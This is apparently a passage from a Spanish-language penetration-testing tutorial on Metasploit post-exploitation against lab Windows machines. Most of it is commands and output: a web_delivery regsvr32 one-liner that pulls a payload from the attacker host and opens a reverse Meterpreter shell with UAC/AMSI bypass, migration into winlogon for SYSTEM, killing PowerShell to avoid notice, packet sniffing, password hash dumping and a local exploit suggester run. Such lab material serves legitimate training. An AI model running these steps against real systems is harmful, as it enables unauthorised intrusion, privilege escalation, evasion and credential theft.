<figure><img src="/files/Uwrr1w4ew9eWSXk7wxWA" alt=""><figcaption></figcaption></figure>

#### Recibimos el meterpreter

```bash
msf6 exploit(multi/handler) > 
[*] Sending stage (177734 bytes) to 192.168.1.241
[*] Meterpreter session 1 opened (192.168.1.247:5555 -> 192.168.1.241:50239) at 2025-05-28 21:21:44 +0200

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  1         meterpreter x86/windows  DESKTOP-ECKQUF3\afern @ DESKTOP-ECKQUF3  192.168.1.247:5555 -> 192.168.1.241:50239 (192.168.1.241)
  
meterpreter > getuid
Server username: DESKTOP-ECKQUF3\afern
```

### Explotación - WebDelivery

Atacaremos igualmente la máquina Windows 11, ya que tenemos el Defender deshabilitado para probar esta técnica.

{% hint style="warning" %}
Debemos indicar un LPORT y un SRVPORT distinto a los usados anteriormente o fallará
{% endhint %}

Usaremos el target 3 Regsvr32 que le mete técnicas de bypass de UAC y AMSI.

```bash
use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
    0   Python                    # Python en el objetivo
    1   PHP                       # PHP en el objetivo
    2   PSH                       # Powershell
=>  3   Regsvr32                  # Bypass de UAC y AMSI (Windows)
    4   pubprn                    # Abusa del servicio pubprn.vbs (Windows antiguos)
    5   SyncAppvPublishingServer  # Bypass de restricciones de ejecución, AppLocker... (Windows)
    6   PSH (Binary)              # Ejecutable Powershell
    7   Linux                     # Payload compatible con Linux
    8   Mac OS X                  # Payload compatible con MacOS

set TARGET 3
set PAYLOAD windows/x64/meterpreter/reverse_http
set LHOST <IP-ATACANTE>
set LPORT 4445
run

[*] Started HTTP reverse handler on http://192.168.1.156:4445
[*] Using URL: http://192.168.1.156:8080/5rZdpH73
[*] Server started.
[*] Run the following command on the target machine:

regsvr32 /s /n /u /i:http://192.168.1.156:8080/5rZdpH73.sct scrobj.dll
```

Copiamos el comando, lo ejecutamos en la máquina Windows 11 y recibimos la sesión de Meterpreter:

```bash
[*] 192.168.1.241    web_delivery - Handling .sct Request
[*] 192.168.1.241    web_delivery - Delivering Payload (4079 bytes)
[!] http://192.168.1.156:4445 handling request from 192.168.1.241; (UUID: mpw4cjph) Without a database connected that payload UUID tracking will not work!
[*] http://192.168.1.156:4445 handling request from 192.168.1.241; (UUID: mpw4cjph) Staging x64 payload (204892 bytes) ...
[!] http://192.168.1.156:4445 handling request from 192.168.1.241; (UUID: mpw4cjph) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.1.156:4445 -> 192.168.1.241:50626) at 2025-05-29 19:49:24 +0200
```

```bash
msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  DESKTOP-ECKQUF3\afern @ DESKTOP-ECK  192.168.1.156:4445 -> 192.168.1.241
                                     QUF3                                 :50626 (192.168.1.241)

msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-ECKQUF3\afern
```

### Migrar a un proceso estable

Lo primero buscamos un proceso estable al que migrar nuestra sesión de Meterpreter. Con `ps` encontramos algunos interesantes como `winlogon.exe` con el PID `440`.

1. **Proceso estable y privilegiado**:
   * Winlogon siempre se ejecuta en segundo plano (no se cierra) y tiene permisos **SYSTEM**
   * Esta técnica también se considera escala de privilegios, ya que al migrar a un proceso SYSTEM automáticamente ganamos una SYSTEM Shell en Meterpreter.

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                          Arch  Session  User                          Path
 ---   ----  ----                          ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                        x64   0
 232   4     smss.exe                      x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 332   316   csrss.exe                     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 384   316   wininit.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 396   376   csrss.exe                     x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 440   376   winlogon.exe                  x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
```

Para migrar el proceso y obtener el SYSTEM es tan sencillo como:

```bash
meterpreter > migrate 440
[*] Migrating from 1104 to 440...
[*] Migration completed successfully.

meterpreter > getpid
Current pid: 440

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Get System

De igual manera podríamos elevar nuestros privilegios a SYSTEM con `getsystem`:

```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Cerrar PowerShell en el objetivo

Algo curioso que podemos hacer es hacer un kill de los procesos relacionados con PowerShell para que se cierre en el objetivo y no llame la atención:

```bash
meterpreter > ps

7820   4892  powershell.exe                x64   1        DESKTOP-ECKQUF3\afern         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
7860   4892  powershell.exe                x64   1        DESKTOP-ECKQUF3\afern         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
8308   4892  powershell.exe                x64   1        DESKTOP-ECKQUF3\afern         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
8420   4892  powershell.exe                x64   1        DESKTOP-ECKQUF3\afern         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
8780   4892  powershell.exe                x64   1        DESKTOP-ECKQUF3\afern         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

```bash
meterpreter > pkill powershell.exe

Filtering on 'powershell.exe'
Killing: 5216, 9192, 8780, 1456, 8420, 8308, 7860, 1148, 3888, 7820, 7536
```

### Monitorizar el tráfico de red

#### Capturando el archivo pcap

```bash
meterpreter > use sniffer
Loading extension sniffer...Success.
meterpreter > sniffer_interfaces

1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )

meterpreter > sniffer_start 2
[*] Capture started on interface 2 (50000 packet buffer)

[*] Capture statistics for interface 2
	packets: 246
	bytes: 73112

meterpreter > sniffer_dump 2 /home/kali/Escritorio/machines/metasploitable.pcap
[*] Flushing packet capture buffer for interface 2...
[*] Flushed 256 packets (80836 bytes)
[*] Downloaded 100% (80836/80836)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to /home/kali/Escritorio/machines/metasploitable.pcap
```

#### Analizando el tráfico con Wireshark en Kali

```
wireshark /home/kali/Escritorio/machines/metasploitable.pcap 
```

<figure><img src="/files/hzU3EyF1FkxDZU7sVt6d" alt=""><figcaption></figcaption></figure>

### Extracción de hashes en Windows

```bash
meterpreter > run post/windows/gather/credentials/credential_collector

[*] Running module against VAGRANT-2008R2
[+] Collecting hashes...
    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
    Extracted: anakin_skywalker:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa
    Extracted: artoo_detoo:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4
    Extracted: ben_kenobi:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859
    Extracted: boba_fett:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9
    Extracted: chewbacca:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8
    Extracted: c_three_pio:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee
    Extracted: darth_vader:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0
    <----SNIP---->
```

```bash
meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
<----SNIP---->
```

### Exploit Suggester

```bash
meterpreter > bg
msf6 post(multi/recon/local_exploit_suggester) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.1.233 - Collecting local exploits for x64/windows...
[*] 192.168.1.233 - 203 exploit checks are being tried...
[+] 192.168.1.233 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 192.168.1.233 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.1.233 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 192.168.1.233 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 192.168.1.233 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
[+] 192.168.1.233 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 192.168.1.233 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 192.168.1.233 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 192.168.1.233 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 192.168.1.233 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 192.168.1.233 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 192.168.1.233 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 48 / 48
[*] 192.168.1.233 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 5   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

### Enumeración con módulos de Metasploit

```bash
ls /usr/share/metasploit-framework/modules/post/windows/
 
capture  escalate  gather  manage  recon  wlan
```

```bash
ls /usr/share/metasploit-framework/modules/post/windows/gather

 ad_to_sqlite.rb                      enum_av.rb                        enum_muicache.rb               lsa_secrets.rb
 arp_scanner.rb                       enum_av_excluded.rb               enum_onedrive.rb               make_csv_orgchart.rb
 avast_memory_dump.rb                 enum_browsers.rb                  enum_patches.rb                memory_dump.rb
 bitcoin_jacker.rb                    enum_chocolatey_applications.rb   enum_powershell_env.rb         memory_grep.rb
 bitlocker_fvek.rb                    enum_chrome.rb                    enum_prefetch.rb               netlm_downgrade.rb
 bloodhound.rb                        enum_computers.rb                 enum_proxy.rb                  ntds_grabber.rb
 cachedump.rb                         enum_db.rb                        enum_putty_saved_sessions.rb   ntds_location.rb
 checkvm.rb                           enum_devices.rb                   enum_services.rb               outlook.rb
 credentials                          enum_dirperms.rb                  enum_shares.rb                 phish_windows_credentials.rb
 dnscache_dump.rb                     enum_domain.rb                    enum_snmp.rb                   psreadline_history.rb
 dumplinks.rb                         enum_domain_group_users.rb        enum_termserv.rb               resolve_sid.rb
 enum_ad_bitlocker.rb                 enum_domain_tokens.rb             enum_tokens.rb                 screen_spy.rb
 enum_ad_computers.rb                 enum_domain_users.rb              enum_tomcat.rb                 smart_hashdump.rb
 enum_ad_groups.rb                    enum_domains.rb                   enum_trusted_locations.rb      tcpnetstat.rb
 enum_ad_managedby_groups.rb          enum_emet.rb                      enum_unattend.rb               usb_history.rb
 enum_ad_service_principal_names.rb   enum_files.rb                     exchange.rb                    win_privs.rb
 enum_ad_to_wordlist.rb               enum_hostfile.rb                  file_from_raw_ntfs.rb          wmic_command.rb
 enum_ad_user_comments.rb             enum_hyperv_vms.rb                forensics                      word_unc_injector.rb
 enum_ad_users.rb                     enum_ie.rb                        get_bookmarks.rb              
 enum_applications.rb                 enum_logged_on_users.rb           hashdump.rb                   
 enum_artifacts.rb                    enum_ms_product_keys.rb           local_admin_search_enum.rb    
```

```bash
meterpreter > run post/windows/gather/enum_logged_on_users

[*] Running module against VAGRANT-2008R2 (192.168.1.233)

Current Logged Users
====================

 SID                                             User
 ---                                             ----
 S-1-5-21-2010520603-3385233033-3932565385-1000  VAGRANT-2008R2\vagrant
 S-1-5-21-2010520603-3385233033-3932565385-1002  VAGRANT-2008R2\sshd_server


[+] Results saved in: /home/kali/.msf4/loot/20250526200536_default_192.168.1.233_host.users.activ_605799.txt

Recently Logged Users
=====================

 SID                                                              Profile Path
 ---                                                              ------------
 S-1-5-18                                                         C:\Windows\system32\config\systemprofile
 S-1-5-19                                                         C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                                         C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-2010520603-3385233033-3932565385-1000                   C:\Users\vagrant
 S-1-5-21-2010520603-3385233033-3932565385-1002                   C:\Users\sshd_server
 S-1-5-21-2010520603-3385233033-3932565385-500                    C:\Users\Administrator
 S-1-5-82-1036420768-1044797643-1061213386-2937092688-4282445334  C:\Users\Classic .NET AppPool
```
